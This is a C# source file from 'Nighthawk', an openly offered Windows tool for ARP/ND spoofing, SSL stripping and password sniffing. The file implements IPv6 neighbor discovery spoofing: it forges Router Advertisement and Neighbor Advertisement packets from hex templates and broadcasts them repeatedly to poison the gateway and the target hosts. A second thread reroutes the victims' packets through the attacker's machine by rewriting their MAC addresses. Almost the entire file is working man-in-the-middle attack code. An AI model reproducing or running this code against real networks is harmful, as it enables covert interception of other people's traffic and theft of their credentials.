using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using SharpPcap.WinPcap;
using PacketDotNet;

/**
Nighthawk - ARP/ND spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2011, 2012  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* ND spoofing, IPv6 routing */
    public class NDTools
    {
        private WinPcapDevice device;

        public bool SpoofingStarted;

        // packet queues (packet storage for BG threads)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        public List<Packet> PacketQueueRouting = new List<Packet>();
        private List<Packet> threadQueueRouting = new List<Packet>();

        private Thread workerSender;
        private Thread workerRouter;

        // simple IPv6 - MAC table
        public Dictionary<string, PhysicalAddress> IPv6toMACTargets;

        private DeviceInfo deviceInfo;
        private PhysicalAddress physicalAddress;

        private string prefix;
        private string gatewayIPv6;

        public NDTools(DeviceInfo deviceInfo)
        {
            device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start ND spoofing (network prefix for RA packets, all detected targets)
        public void StartSpoofing(string prefix, List<Target> targets)
        {
            this.prefix = prefix;
            gatewayIPv6 = deviceInfo.GatewayIPv6;

            physicalAddress = deviceInfo.PMAC;

            SpoofingStarted = true;
            
            // parse targets to a simple IPv6 - MAC dictionary
            IPv6toMACTargets = new Dictionary<string, PhysicalAddress>();
            targets.ForEach(t => t.IPv6List.ForEach(i => IPv6toMACTargets.Add(i, t.PMAC)));

            PacketQueue.Clear();

            // create ND sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "NDP sender thread";
            workerSender.Start();

            // create IPv6 router worker
            workerRouter = new Thread(new ThreadStart(WorkerRouter));
            workerRouter.Name = "IPv6 router thread";
            workerRouter.Start();
        }

        // stop spoofing
        public void StopSpoofing()
        {
            SpoofingStarted = false;

            // stop threads & send correct gateway (not implemented)
            if (workerSender != null && workerSender.IsAlive)
            {
                workerSender.Join();
            }

            threadQueue.Clear();
            threadQueueRouting.Clear();
            
            PacketQueue.Clear();
            PacketQueueRouting.Clear();
        }

        // create a fake RA packet (network prefix)
        private EthernetPacket GenerateRouterAdvertisement(string prefix)
        {
            var linkLocal = IPAddress.Parse(deviceInfo.LinkLocal);
            var ipv6 = BitConverter.ToString(linkLocal.GetAddressBytes()).Replace("-", "");

            // prepare RA packet
            var bytes = Network.HexToByte("333300000001"
                + deviceInfo.PMAC.ToString() +
                "86dd6e00000000703aff"
                + ipv6 +
                "ff02000000000000000000000000000186002fe7ff080800000000000000040005010000000005dc030440c0111111110404040400000000"
                + Network.IPv6ToFullHex(prefix) + 
                "0101"
                + deviceInfo.PMAC.ToString() + 
                "1803000800001111000000000000000000000000000000001903000001010101ff0200000000000000000000000000fb");

            return (EthernetPacket)Packet.ParsePacket(LinkLayers.Ethernet, bytes);
        }

        // create a fake ND packet (source IP)
        private EthernetPacket GenerateNDAdvertisement(string sourceIP)
        {
            // prepare neighbor advertisement packet
            var bytes = Network.HexToByte(
                IPv6toMACTargets[gatewayIPv6]
                + deviceInfo.PMAC.ToString() +
                "86dd6000000000203aff"
                + Network.IPv6ToFullHex(sourceIP)
                + Network.IPv6ToFullHex(gatewayIPv6)
                + "880067f760000000"
                + Network.IPv6ToFullHex(sourceIP)
                + "0201"
                + deviceInfo.PMAC.ToString());

            return (EthernetPacket)Packet.ParsePacket(LinkLayers.Ethernet, bytes);
        }

        // get IPv6 gateway
        public string GetIPv6Gateway()
        {            
            OperatingSystem system = Environment.OSVersion;

            // prepare process
            Process p = new Process();

            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            p.StartInfo.FileName = "cmd";

            // Vista, Windows 7/8 - use "netsh"
            if (system.Version.Major > 5)
            {
                p.StartInfo.Arguments = "/k netsh int ipv6 show route | findstr ::/0 && exit";
                p.Start();
                
                var output = p.StandardOutput.ReadToEnd();

                p.WaitForExit();
                p.Dispose();
                
                var lines = output.Contains("\r\n") ? Regex.Split(output, "\r\n") : new string[] {output};
                var line = lines.First();

                var parts = Regex.Split(line, " ");
                var gateway = parts[parts.Length - 1];

                return gateway;
            }

            p.Dispose();

            return string.Empty;
        }

        // worker function for sending RA packets
        public void WorkerSender()
        {
            while (SpoofingStarted)
            {
                // we need to generate packets inside the loop, because IPv6toMACTargets can change (86 bytes for ND, 166 for RA ?)
                var sendQueue = new SendQueue(IPv6toMACTargets.Count * 86 + 166 + 512);

                sendQueue.Add(GenerateRouterAdvertisement(prefix).Bytes);

                foreach (var target in IPv6toMACTargets)
                {
                    // send spoofed ND advertisements to the gateway
                    if(target.Key != gatewayIPv6) sendQueue.Add(GenerateNDAdvertisement(target.Key).Bytes);
                }

                sendQueue.Transmit(device, SendQueueTransmitModes.Normal);

                sendQueue.Dispose();

                Thread.Sleep(2500);
            }
            
            return;
        }

        // worker function for routing IPv6 packets
        public void WorkerRouter()
        {
            while (SpoofingStarted)
            {
                // size of packets - needed for send queue (set some starting value - it seems the length is not set correctly during threadQueue packet copying)
                int bufferSize = 2048;

                // copy packets to threadRoutingQueue
                lock (PacketQueueRouting)
                {
                    foreach (Packet packet in PacketQueueRouting)
                    {
                        threadQueueRouting.Add(packet);
                        bufferSize += packet.Bytes.Length;
                    }

                    PacketQueueRouting.Clear();
                }

                if (threadQueueRouting.Count > 0)
                {
                    var sendQueue = new SendQueue(bufferSize);

                    // loop through packets and change MAC addresses
                    foreach (Packet packet in threadQueueRouting)
                    {
                        if (packet == null) continue;

                        var ethernetPacket = (packet as EthernetPacket);
                        if (ethernetPacket == null) continue;

                        var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));

                        var sourceIP = ip.SourceAddress.ToString();
                        var destinationIP = ip.DestinationAddress.ToString();

                        var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();

                        if (sourceIP == deviceInfo.IPv6 || destinationIP == deviceInfo.IPv6) continue;

                        // skip local network traffic
                        if ((sourceIP.Contains(prefix.Replace("::", ":")) && destinationIP.Contains(prefix.Replace("::", ":"))) || (sourceIP.Contains("fe80::") || destinationIP.Contains("fe80::"))) continue;
                        
                        // check for IPv6 - MAC entry existance (check only addresses from this network) and add it if necessary (we need this because scanner cannot pick up IPv6 addresses of all the targets)
                        if (sourceIP.Contains(prefix.Replace("::", ":")) && !IPv6toMACTargets.ContainsKey(sourceIP) && !sourceIP.Contains("fe80::"))
                        {
                            lock (IPv6toMACTargets)
                            {
                                IPv6toMACTargets.Add(sourceIP, ethernetPacket.SourceHwAddress);
                            }
                        }

                        // incoming packets (internet -> nighthawk) - change destination MAC back to target's MAC
                        if (IPv6toMACTargets.ContainsKey(destinationIP) && (destinationMAC != IPv6toMACTargets[destinationIP].ToString()))
                        {
                            ethernetPacket.SourceHwAddress = physicalAddress;
                            ethernetPacket.DestinationHwAddress = IPv6toMACTargets[destinationIP];

                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                        }

                        // outgoing packets (targets -> nighthawk) - change destination MAC to gateway's MAC
                        if (IPv6toMACTargets.ContainsKey(sourceIP) && (destinationMAC != IPv6toMACTargets[gatewayIPv6].ToString()))
                        {
                            ethernetPacket.SourceHwAddress = physicalAddress;
                            ethernetPacket.DestinationHwAddress = IPv6toMACTargets[gatewayIPv6];

                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                        }
                    }

                    sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
                    sendQueue.Dispose();

                    threadQueueRouting.Clear();
                }
                else
                {
                    Thread.Sleep(1);
                }
            }

            return;
        }
    }

    public enum StaticNDOperation
    {
        Add,
        Remove
    }
}
